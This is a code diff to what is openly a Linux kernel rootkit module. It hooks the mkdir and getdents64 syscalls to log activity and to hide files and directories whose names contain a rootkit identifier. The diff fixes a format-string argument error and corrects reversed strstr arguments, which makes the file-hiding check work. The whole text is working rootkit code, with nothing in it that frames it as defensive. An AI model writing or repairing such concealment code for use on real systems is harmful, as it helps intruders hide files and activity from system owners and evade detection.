@@ -70,7 +70,7 @@ static asmlinkage long hooked_mkdir(const struct pt_regs *regs){ //hook function
 		sprintf(buffer, "[mkdir] directory = %s   mode = 0x%x\n", dir_name, mode); //copy message to buffer
 	}
 	else{ //if not sucsessfuly copied
-		sprintf(buffer, "[mkdir] directory = ??? (unable to be copied)    mode = 0x%x\n", dir_name, mode); //copy message to buffer
+		sprintf(buffer, "[mkdir] directory = ??? (unable to be copied)    mode = 0x%x\n", mode); //copy message to buffer
 	}
 	log(buffer); //sends message
 	return sys_mkdir.orig_syscall(regs); //executes original syscall
@@ -116,7 +116,7 @@ static asmlinkage long hooked_getdents64(const struct pt_regs *regs){ //hook fun
 		//hides all files/directories beginning with rootkit_id
         current_dir = (void *)dirent_ker + offset; //goes to next directory
 
-        if ( strstr(ROOTKIT_ID, current_dir->d_name) != NULL){ //Compare the first bytes of current_dir->d_name to rootkit id
+        if ( strstr(current_dir->d_name, ROOTKIT_ID) != NULL){ //Compare the first bytes of current_dir->d_name to rootkit id
 			sprintf(buffer,"[rootkit] getdents64- hiding %s\n", current_dir->d_name);
 			log(buffer);
 
